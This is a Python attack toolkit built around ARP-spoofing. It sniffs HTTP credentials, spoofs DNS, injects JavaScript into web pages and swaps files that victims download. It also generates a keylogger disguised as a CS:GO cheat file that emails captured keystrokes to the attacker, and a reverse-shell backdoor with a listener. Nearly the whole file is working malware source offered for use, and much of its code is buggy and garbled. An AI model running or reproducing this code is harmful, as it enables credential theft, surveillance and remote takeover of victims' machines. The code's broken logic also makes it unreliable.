#/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse, getpass
import time, pyshark
import sys, subprocess, os
from multiprocessing import Process
import netfilterqueue, re
import socket, json, base64

print("[+] Confirm whether you have executed ARP Spoof attack or not. ")

def packet_sniffer():
	print("[+] You have to install sslstrip tool first to get the best use from this.")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
	def sniff(interface):
		scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

	def get_url(packet):
		return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
	
	def get_login_info(packet):
		if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load
			keywords = ["username", "user", "login", "password", "pass"]
			for keyword in keywords:
				return load
				
	def process_sniffed_packet(packet):
		if packet.haslayer(http.HTTPRequest):
			url = get_url(packet)
			print ("[+] HTTP Request >> " + url)
		
			login_info = get_login_info(packet)
			if login_info:
				print("\n\n[+] Possible username/password => " + login_info + "\n\n")
		
		else:
			for packet in packets:
				try:
					if "ssl" in packet.ssl.layer_name:
						print("[-] This tool is not able to sniff HTTPS connection.\n\n")
						print("But, indeed we can give you the IP Address and MAC Address of the Web Site you are trying to connect to.")
						print("Destination IP Address: " + packet.ip.dst)
						print("Destination MAC Address: " + packet.eth.addr)
						break
				
				except AttributeError:
					pass
				
		
	packets = pyshark.LiveCapture(interface='wlan0', bpf_filter = 'ip and tcp port 443')
	packets.sniff(timeout = 10)
	sniff('wlan0')
	
def dns_spoof():
	print("[+] Wait while automatically executing some system commands.\n")
	print("[+] You need some server like apache2 to be installed to perform this attack.")
	print("So, if you don't have this installed already, then install it first")
	print("\n[+] Also you have to install a tool called sslstrip.\n")
	return_code_apache = os.system("apache2")
	return_code_service = os.system("service")
	if return_code_apache and return_code_service is int(256):
		os.system("service apache2 start")
	else:
		print("\napache2 and service are not installed in your system. Please install it first\n")
		
	os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
	os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
	domain_name = input("Enter the domain name on which you want to do dns spoof: ")
	def process_packet(packet):
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname = scapy_packet[scapy.DNSQR].qname
			if domain_name in qname:
				print("[+]Spoofing Target")
				answer = scapy.DNSRR(rrname=qname, rdata="<Enter your system's IP Address.")
				scapy_packet[scapy.DNS].an = answer
				scapy_packet[scapy.DNS].ancount = 1
			
				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].chksum
				del scapy_packet[scapy.UDP].chksum
				del scapy_packet[scapy.UDP].len

				packet.set_payload(str(scapy_packet))
		packet.accept()
	
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_packet)
	queue.run()

def code_injector():
	print("[+] Wait while automatically executing some system commands.\n")
	print("\n[+] You have to install a tool called sslstrip.\n\n")
	print("And run it manually")
	os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
	os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
	choice_value = input("[+] Do you want to enter javascript code manually or default one (m/d) ?: ")
	if choice_value is m or M:
		script = input("\nEnter the javascript code which you want to inject in the target machine: ")
	elif choice_value is d or D:
		script = "<script>alert('test');</script>"
	else:
		print("Wrong choice entered by the user")

	ack_list = []

	def set_load(packet, load):
		packet[scapy.Raw].load = load 
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum
		return packet
	
	def process_packet(packet):
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.Raw):
			load = scapy_packet[scapy.Raw].load
			try:
				if scapy_packet[scapy.TCP].dport == 10000:
					print("[+] Request")
					load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
					load = load.replace("HTTP/1.1", "HTTP/1.0")
					
				elif scapy_packet[scapy.TCP].sport == 10000:
					print("[+] Response")
					injection_code = script
					load = load.replace("</body>", injection_code + "</body>")
					content_length_search = re.search("(?:Content-Length: \s)(\d*)", load)
					if content_length_search and "text/html" in load:
						content_length = content_length_search.group(1)
						new_content_length = int(content_length) + len(injection_code)
						load = load.replace(content_length, str(new_content_length))
			except IndexError:
				pass
				
				
			if load != scapy_packet[scapy.Raw].load:
				new_packet = set_load(scapy_packet, load)
				packet.set_payload(str(new_packet))
				
		packet.accept()

	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_packet)
	queue.run()

def execute_and_report():
	print("[+] It's the part where you have to perform some manual operations.")
	print("[+] After few seconds, a file will be available in your system which you have to get downloaded and executed by the target.")
	print("[+] Then the malware will do it's functions and it will report to you through mail")
	print("[+] Remember you should have either two factor authentication enabled or less secure apps to send mail.")
	email_id = input("[+]Enter your email id: ")
	password = getpass.getpass("\n[+] Enter your Password: ")
	print("[+] Wait while we are writing that file for you")
	with open("csgo_cheat_sheet.py", "w") as file:
		file.writelines(["#!/usr/bin/env python\n", "import pynput.keyboard\n", "import threading, smtplib\n"])
		file.write("class Keylogger:\n")
		file.write("	def __init__(self, time_interval, email, password):\n")
		file.write("		self.log = 'Keylogger started'\n")
		file.writelines(["		self.interval = time_interval\n", "		self.email = email\n", "		self.password = password\n"])
		file.write("	def append_to_log(self, string):\n")
		file.write("		self.log = self.log + string\n")
		file.write("	def process_key_process(self, key):\n")
		file.writelines(["		try:\n", "			current_key = str(key.char)\n", "		except AttributeError:\n", "			if key == key.space:\n", "				current_key = ''\n", "			else:\n", "				current_key = ' ' + str(key) + ' '\n", "        self.append_to_log(current_key)\n"])
		file.write("	def report(self):\n")
		file.write(r"		self.send_mail(self.email, self.password, ('\n\n') + self.log)")
		file.write("\n")
		file.write("		self.log = ''\n")
		file.write("		timer = threading.Timer(self.interval, self.report)\n")
		file.write("		timer.start()\n")
		file.write("	def send_mail(self, email, password, message):\n")
		file.write("		server = smtplib.SMTP('smtp.gmail.com', 587)\n")
		file.write("		server.starttls()\n")
		file.write("		server.login(email, password)\n")
		file.write("		server.sendmail(email, email, message)\n")
		file.write("		server.quit()\n")
		file.write("	def start(self):\n")
		file.write("		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)\n")
		file.write("		with keyboard_listener:\n")
		file.write("			self.report()\n")
		file.write("			keyboard_listener.join()\n")
		file.write("my_keylogger = Keylogger(60, '%s', '%s')\n" % (email_id, password))
		file.write("my_keylogger.start()\n")
	print("[+] Now you have to get this file downloaded by the target and wait for the reply to come to you via email.")

def replace_downloads():
	ack_list = []

	print("[+] This part will replace the file which is downloaded by the target to the file of your choice so that you can download \n")
	print("malware or any other malicious file in the target system")
	print("\nWait for the target to download some file, at that time, your file will be downloaded instead of file inteded by the user.")

	os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
	os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
	def set_load(packet, load):
		packet[scapy.RAW].load = load 
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum
		return packet
	
	def process_packet(packet):
		scapy_packet = scapy.IP(packet.get_payload())
		
		if scapy_packet[scapy.TCP].dport or scapy_packet[scapy.TCP].sport == 10000:
			scapy_packet.show()
			
		if scapy_packet.haslayer(scapy.Raw):
			if scapy_packet[scapy.TCP].dport == 10000:
				if ".exe" in scapy_packet[scapy.RAW].load and "<Enter your systems IP Adress"> not in scapy_packet[scapy.Raw].load:
					print("[+] exe Request")
					ack_list.append(scapy_packet[scapy.TCP].ack)
			elif scapy_packet[scapy.TCP].sport == 10000:
				if scpay_packet[scapy.TCP].seq in ack_list:
					ack_list.remove(scapy_packet[scapy.TCP].seq)
					print("[+] Replacing File")
					modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n")
					packet.set_payload(str(modified_packet))
					
		packet.accept()

	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_packet)
	queue.run()

def reverse_backdoor():
	print("[+] Now you will be connected to the target device, and you will get the reverse shell of target.")
	print("[+] For this, you have to make your target download the reverse backdoor into it's system.")
	print("[+] You can do so by the replacing download feature of this tool only or you can do so by phishing attempts.")
	print("[+] The reverse backdoor will be available in your local system within few minutes, and after that, you can \n")
	print("transfer it to the remote system.")
	print("[+] The Listener required for this reverse backdoor is developed in this tool only.")

	with open("reverse_shell.py", "w") as file:
		file.write("import socket\n")
		file.write("import subprocess, json, base64, sys\n")
		file.write("\nClass Backdoor:\n")
		file.write("	def __init__(self, ip, port):\n")
		file.write("		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
		file.write("		self.connection.connect((ip, port))\n")
		file.write("	def reliable_send(self, data):\n")
		file.write("		json_data = json.dumps(data)\n")
		file.write("		self.connection.send(json_data)\n")
		file.write("	def reliable_receive(self):\n")
		file.write("		while True:\n")
		file.write("			try:\n")
		file.write("				json_data = self.connection.recv(1024)\n")
		file.write("				return json.loads(json_data)\n")
		file.write("			except ValueError:\n")
		file.write("				continue\n")
		file.write("	def execute_system_command(self, command):\n")
		file.write("		DEVNULL = open(os.devnull,'wb')\n")
		file.write("		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)\n")
		file.write("	def change_working_directory_to(self, path):\n")
		file.write("		os.chdir(path)\n")
		file.write("		return '[+] Changing working directory to ' + path\n")
		file.write("	def read_file(self, path):\n")
		file.write("		with open(path, 'rb') as file:\n")
		file.write("			return base64.b64encode(file.read())\n")
		file.write("	def write_file(self, path, content):\n")
		file.write("		with open(path, 'wb') as file:\n")
		file.write("			file.write(base64.b64decode(content)\n")
		file.write("			return '[+]Upload Successful'\n")
		file.write("	def run(self):\n")
		file.write("		while True:\n")
		file.write("			command = self.reliable_recieve()\n")
		file.write("			try:\n")
		file.write("				if command[0] == 'exit':\n")
		file.write("					self.connection.close()\n")
		file.write("					sys.exit()\n")
		file.write("				elif command[0] == 'cd' and len(command) > 1:\n")
		file.write("					command_result = self.change_working_directory_to(command[1])\n")
		file.write("				elif command[0] == 'download' and len(command) > 1:\n")
		file.write("					command_result = self.read_file(command[1])\n")
		file.write("				elif command[0] == 'upload' and len(command) > 1:\n")
		file.write("					command_result = self.write_file(command[1], command[2])\n")
		file.write("				else:\n")
		file.write("					command_result = self.execute_system_command(command)\n")
		file.write("			except Exception:\n")
		file.write("				error_result = '[-] Error during command execution\n")
		file.write("			self.reliable_send(command_result)\n")
		file.write("		connection.close()\n")
		file.write("try:\n")
		file.write("	myBackdoor = Backdoor('<Gateway IP Address>', 4444)\n")
		file.write("	myBackdoor.run()\n")
		file.write("except Exception:\n")
		file.write("	sys.exit()\n")

	print("[+] You can see the reverse_shell.py file in your local system in the same directory.\n")
	choice_for_listener = input("Do you want to start the listener? (y/n): ")

	if choide_for_listener == 'y' or 'Y':
		class Listener:
			def __init__(self, ip, port):
				listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

				listener.bind((ip, port))

				listener.listen(0)
				print("[+]Waiting for connection")
				self.connection, self.address = listener.accept()
				print("[+]Got a connection from " + str(address))
			
			def reliable_send(self, data):
				json_data = json.dumps(data)
				self.connection.send(json_data)
			
			def reliable_receive(self):
				while True:
					try:
						json_data = self.connection.recv(1024)
						return json.loads(json_data)
					except:
						continue
			
			def execute_remotely(self, command):
				self.reliable_send(command)
				
				if command[0] == "exit":
					self.connection.close()
					exit()
					
				return self.reliable_receive()
			
			def write_file(self, path, content):
				with open(path, "wb") as file:
					file.write(base64.b64decode(content))
					return ("[+] Download Successful")
				
			def read_file(self, path):
				with open(path, "rb") as file:
					return base64.b64encode(file.read())
		
			def run(self):
				while True:
					command = input(">> ")
					command = command.split(" ")
					try:
						if command[0] == "upload":
							file_content = self.read_file(command[1])
							command.append(file_content)
						
						result = self.execute_remotely(command)
					
						if command[0] == "download" and "[-] Error " not in result:
							result = self.write_file(command[1], result)
					except Exception:
						result = "[-] Error during command execution."
						
					print(result)
				
		myListener = Listener("<Gateway IP Address>", 4444)
		myListener.run()

	elif choice_for_listener == 'n' or 'N':
		print("[+] Exiting...")			
		exit()
	else:
		print("[-] You have not entered the correct choice (only y/Y/n/N are allowed).")
		exit()

print("Now, you have to choose one of the following operations: ")
print("\n 1. Packet Sniffer \n 2. DNS Spoof \n 3. Code Injector \n 4. Execute command in remote system \n 5. replace downloads done by target \n 6. Perform reverse backdoor ")
choice = input("Enter your choice: ")
switch = {
	1: [packet_sniffer(), exit()],
	2: [dns_spoof(), os.system("iptables --flush"), exit()],
	3: [code_injector(), os.system("iptables --flush"), exit()],
	4: [execute_and_report(), exit()],
	5: [replace_downloads(), os.system("iptables --flush"), exit()],
	6: [reverse_backdoor(), exit()]
}

switch.get(choice, "Invalid choice entered by the user")